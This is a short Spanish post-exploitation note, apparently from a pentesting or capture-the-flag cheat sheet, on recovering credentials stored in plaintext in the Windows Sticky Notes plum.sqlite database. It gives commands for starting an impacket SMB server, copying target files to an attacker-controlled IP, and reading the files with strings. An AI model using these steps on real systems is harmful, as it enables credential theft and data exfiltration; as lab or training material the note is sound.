Aplicación que puede guardar contraseñas en texto claro. En AppData se guarda información de StickyNotes.
Puede encontrarse un directorio llamado plum-sqlite, este puede contener credenciales.

Para comprobar los ficheros es mejor transferirlos a nuestra máquina en local.
Montar servidor SMB en la máquina local para transferir los ficheros -->`impacket-smbserver smbFolder $(pwd) -smb2support`
Transferir ficherso desde la máquina objetivo --> `copy <fichero> \\10.10.14.20\smbFolder\<fichero>`

Posteriormente podemos ver las cadenas de caracteres imprimibles en un fichero .sqlite --> `strings <fichero>`